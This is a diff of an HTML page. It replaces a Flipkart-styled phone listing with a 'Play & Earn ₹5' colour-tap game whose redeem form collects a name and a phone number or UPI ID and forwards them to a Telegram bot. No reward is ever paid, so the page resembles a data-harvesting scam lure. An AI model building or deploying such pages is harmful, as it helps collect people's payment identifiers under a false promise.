@@ -1,61 +1,307 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-     <meta charset="UTF-8">
-     <meta name="viewport" content="width=decice-width, initial-scale=1.0">
-     <title>online shopping site for mobiles,electronics and furniture</title>
-     <link rel="icon" href="data:image/jpeg;base64,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" type="image/x-icon">
-     <link rel="stylesheet" href="style.css">
-  </head>
-  <body>
-
-    <div class="navbar">
-      <div class="company-name"> flipkart <br>
-         <i style="color: rgb(176, 201, 245); font-size: 20px;">explore</i> 
-         <i style="color: rgb(253, 253, 7);font-size: 20px;">plus</i>
-      </div>
-         <input type="text" class="search-bar" placeholder=" &#128269; Search... " style="padding-left: 20px;">
-         <span class="seller-icon">⛟ <b style="color: rgb(255, 255, 255);"><i>seller</i></b></span>
-      <a href="login.html">
-         <button class="sign-in-button"><b>Sign In</b></button>
-      </a>
-      <a href="cart.html">
-         <span class="cart-icon">&#128722; cart</span>
-        </a> 
-  </div><hr>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Play & Earn ₹5</title>
   <style>
-   .order{
-      background-color: #ffffff;
-    
-    color: #4310db;
-    box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
-    width: 400px;
-    margin: 0 auto;
-    padding: 20px;
-    display:contents;
-    
-   }
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #e0f7fa;
+      text-align: center;
+    }
+    header {
+      background: #006064;
+      color: white;
+      padding: 20px;
+    }
+    #banner {
+      background: url('https://via.placeholder.com/400x200?text=Play+Color+Game+%26+Earn+%E2%82%B95');
+      background-size: cover;
+      height: 200px;
+      position: relative;
+    }
+    #start-button {
+      position: absolute;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: #00796b;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      font-size: 18px;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    .color-btn {
+      padding: 40px;
+      margin: 10px;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      color: white;
+      font-weight: bold;
+      transition: transform 0.2s;
+    }
+    .color-btn:active {
+      transform: scale(0.95);
+    }
+    #status, #timer, #target, #banned, #word-test, #finish {
+      margin-top: 20px;
+      font-size: 18px;
+    }
+    #next-btn, #redeem-btn {
+      margin-top: 20px;
+      padding: 10px 20px;
+      background: #00695c;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 18px;
+    }
+    #game-container {
+      display: none;
+    }
+    #form-section {
+      display: none;
+      padding: 20px;
+    }
+    input {
+      padding: 10px;
+      width: 80%;
+      margin: 10px auto;
+      font-size: 16px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
   </style>
-  <form class="order">
-    
-       <table  class="image-container" cellpadding="1" >
-   <tr>
-     <td><img src="https://encrypted-tbn1.gstatic.com/shopping?q=tbn:ANd9GcT43KXma2gBaJzhb6xga1fHBf44Hn5nVIFoIH0UQJBSq4HYvI0TQQuDCmZ2HpJucva46vN3Ha2IYK_N9Kc84BN3HmqSJ84eF7ORamDC4q2KD4bQ3RBSDfh4sComKKQBBhwnwh5VORHFPA&usqp=CAc" > 
+</head>
+<body>
 
-      <td><h3>realme Narzo N53</h3></td> <td>  <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_62673a.png" height="30px" width="60px"></td> 
-  </td></tr>
+<header>
+  <h1>🎮 Play This Game & Earn ₹5</h1>
+</header>
 
-  </table>
-  <table>
-     <tr><td><img src="https://encrypted-tbn1.gstatic.com/shopping?q=tbn:ANd9GcRoUCnPDBaD48m1Hs4puD1z9_d3pdBYKPeaLDv5E44Ob1wUGltgHWSXgHHrU2LaQWK9sS3IpEhzBs4PSYhijfiB_V2GVD3MYdBzjTKCled_WwGmiOxDFurYbo1nvR0CGvVXLYp9v913LA&usqp=CAc" >
-   <td> <h3>realme 11X 5G</h3></td> <td><img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_62673a.png" height="30px" width="60px"></td>  
-   </td></tr>
-     <tr><td><img src="https://encrypted-tbn1.gstatic.com/shopping?q=tbn:ANd9GcSOv-RMQKzlSwCvDHfrSvPg84OUzVqKEV0EvqopyYnkfQEAvPmXjOYq5gs8-FOR5DYD7ccvHI2Mq8pfUMhyjUdhKcbAgiU48RwTGWfnx6Qia3L3dhSMenV2hCWjG4nUSCt08c6nxA&usqp=CAc"     >  </td></tr>                                                     
-     <tr><td><img src="https://encrypted-tbn0.gstatic.com/shopping?q=tbn:ANd9GcRyPbQj11SHh16nOP7TeLefQl9Y35SoTnYWWonuLTsL35iRlGmat7H1_l0Qyj-h5iYqMPQxHg4o9usGUedlZ_OoOLsOmyTaQtL3iuh65CBEGEKxwfhFSt-xlOdydvjOuLFyGcfOCwnr1fw&usqp=CAc"></td> </tr>
-     <tr><td><img src="https://encrypted-tbn2.gstatic.com/shopping?q=tbn:ANd9GcSN_Mkz1f-2NFY_8uu5WpyzPQVJNTih3wCKJ17D2_eKuEbYd83RqcpDxUZpu9a1qsrHL-_nrl3Z07JkFeTUBr9_LejEcnHOVPlteeEYPzQIBpwnSkxfaJAwiE2GEU3dCw6xysnxOueCzQ&usqp=CAc"></td> 
-     
-   </tr>
-  </table>
-</form>
-  </body>
+<div id="banner">
+  <button id="start-button" onclick="startGame()">Start Game</button>
+</div>
+
+<div id="game-container">
+  <h2 id="stage-title">Color Tap Challenge</h2>
+  <div id="game-area"></div>
+  <div id="target"></div>
+  <div id="timer"></div>
+  <div id="banned"></div>
+  <div id="word-test"></div>
+  <div id="status"></div>
+  <div id="finish" style="display:none; font-size:22px; color:green;">🎉 You completed all 5 stages and earned ₹5!</div>
+  <button id="next-btn" onclick="nextStage()">Next Stage</button>
+  <button id="redeem-btn" onclick="showRedeemForm()">🎁 Redeem ₹5</button>
+</div>
+
+<div id="form-section">
+  <h2>🎁 Enter Details to Redeem</h2>
+  <input type="text" id="name" placeholder="Your Name" />
+  <input type="text" id="number" placeholder="Phone or UPI ID" />
+  <button onclick="sendToTelegram()">Send</button>
+</div>
+
+<script>
+const colors = ['RED', 'GREEN', 'BLUE', 'YELLOW'];
+const colorHex = {
+  RED: '#f44336',
+  GREEN: '#4caf50',
+  BLUE: '#2196f3',
+  YELLOW: '#ffeb3b'
+};
+
+let stage = 1;
+let score = 0;
+let timer, timeoutID, correctColor, bannedColor, correctAnswer;
+
+function startGame() {
+  document.getElementById('banner').style.display = 'none';
+  document.getElementById('game-container').style.display = 'block';
+  startStage();
+}
+
+function resetGame(msg) {
+  alert(msg);
+  stage = 1;
+  score = 0;
+  startStage();
+}
+
+function nextStage() {
+  stage++;
+  score = 0;
+  startStage();
+}
+
+function startStage() {
+  document.getElementById('status').textContent = '';
+  document.getElementById('timer').textContent = '';
+  document.getElementById('banned').textContent = '';
+  document.getElementById('word-test').textContent = '';
+  document.getElementById('target').textContent = '';
+  document.getElementById('game-area').innerHTML = '';
+  document.getElementById('next-btn').style.display = 'none';
+  document.getElementById('redeem-btn').style.display = 'none';
+
+  switch(stage) {
+    case 1:
+      document.getElementById('stage-title').textContent = 'Stage 1: Tap the Correct Color';
+      loadColorTap(); break;
+    case 2:
+      document.getElementById('stage-title').textContent = 'Stage 2: Tap Fast!';
+      loadTimedTap(); break;
+    case 3:
+      document.getElementById('stage-title').textContent = 'Stage 3: Avoid Banned Color';
+      loadAvoidTap(); break;
+    case 4:
+      document.getElementById('stage-title').textContent = 'Stage 4: Tap the TEXT COLOR';
+      loadStroopTest(); break;
+    case 5:
+      document.getElementById('stage-title').textContent = 'Stage 5: Speed Tap Madness';
+      currentRound = 0;
+      loadSpeedTap(); break;
+    default:
+      document.getElementById('finish').style.display = 'block';
+      document.getElementById('redeem-btn').style.display = 'inline-block';
+  }
+}
+
+function loadColorTap() {
+  correctColor = colors[Math.floor(Math.random() * colors.length)];
+  document.getElementById('target').textContent = `Tap: ${correctColor}`;
+  loadButtons(color => checkColorTap(color, correctColor, 5));
+}
+
+function loadTimedTap() {
+  correctColor = colors[Math.floor(Math.random() * colors.length)];
+  document.getElementById('target').textContent = `Tap: ${correctColor}`;
+  let timeLeft = 5;
+  document.getElementById('timer').textContent = `⏱ ${timeLeft}s`;
+  timer = setInterval(() => {
+    timeLeft--;
+    document.getElementById('timer').textContent = `⏱ ${timeLeft}s`;
+    if (timeLeft <= 0) {
+      clearInterval(timer);
+      resetGame('⏰ Too Slow! Back to Stage 1');
+    }
+  }, 1000);
+
+  loadButtons(color => {
+    clearInterval(timer);
+    checkColorTap(color, correctColor, 5);
+  });
+}
+
+function loadAvoidTap() {
+  bannedColor = colors[Math.floor(Math.random() * colors.length)];
+  document.getElementById('banned').textContent = `❌ Don’t tap: ${bannedColor}`;
+  loadButtons(color => {
+    if (color === bannedColor) resetGame('You tapped the banned color!');
+    else checkColorTap(color, 'safe', 5);
+  });
+}
+
+function loadStroopTest() {
+  const word = colors[Math.floor(Math.random() * colors.length)];
+  const color = colors[Math.floor(Math.random() * colors.length)];
+  correctAnswer = color;
+  const wordTest = document.getElementById('word-test');
+  wordTest.textContent = word;
+  wordTest.style.color = colorHex[color];
+  loadButtons(color => {
+    if (color === correctAnswer) checkColorTap(color, correctAnswer, 5);
+    else resetGame('❌ Wrong color! Back to Stage 1');
+  });
+}
+
+let currentRound = 0;
+function loadSpeedTap() {
+  if (currentRound >= 10) {
+    startStage();
+    return;
+  }
+  correctColor = colors[Math.floor(Math.random() * colors.length)];
+  document.getElementById('target').textContent = `Tap Fast: ${correctColor}`;
+  let timeLeft = 2;
+  document.getElementById('timer').textContent = `⏱ ${timeLeft}s`;
+  timer = setInterval(() => {
+    timeLeft--;
+    document.getElementById('timer').textContent = `⏱ ${timeLeft}s`;
+    if (timeLeft <= 0) {
+      clearInterval(timer);
+      resetGame('Too Slow! Back to Stage 1');
+    }
+  }, 1000);
+
+  loadButtons(color => {
+    clearInterval(timer);
+    if (color === correctColor) {
+      currentRound++;
+      setTimeout(loadSpeedTap, 500);
+    } else {
+      resetGame('Wrong Tap! Back to Stage 1');
+    }
+  });
+}
+
+function checkColorTap(tapped, expected, required) {
+  if (expected === 'safe' || tapped === expected) {
+    score++;
+    document.getElementById('status').textContent = `✅ (${score}/${required})`;
+    if (score >= required) {
+      document.getElementById('next-btn').style.display = 'inline-block';
+    } else {
+      setTimeout(startStage, 800);
+    }
+  } else {
+    resetGame('❌ Wrong tap! Back to Stage 1');
+  }
+}
+
+function loadButtons(callback) {
+  const area = document.getElementById('game-area');
+  area.innerHTML = '';
+  const shuffled = [...colors].sort(() => 0.5 - Math.random());
+  shuffled.forEach(c => {
+    const btn = document.createElement('button');
+    btn.className = 'color-btn';
+    btn.style.backgroundColor = colorHex[c];
+    btn.textContent = c;
+    btn.onclick = () => callback(c);
+    area.appendChild(btn);
+  });
+}
+
+function showRedeemForm() {
+  document.getElementById('form-section').style.display = 'block';
+  window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
+}
+
+function sendToTelegram() {
+  const name = document.getElementById('name').value.trim();
+  const number = document.getElementById('number').value.trim();
+  if (!name || !number) return alert('Please enter your name and number.');
+
+  const message = `New Game Redeem:\nName: ${name}\nContact: ${number}`;
+  const botToken = 'YOUR_BOT_TOKEN';
+  const chatId = 'YOUR_CHAT_ID';
+
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: chatId, text: message })
+  })
+    .then(res => res.ok ? alert('✅ Sent to Telegram!') : alert('❌ Failed to send'));
+}
+</script>
+
+</body>
 </html>
+
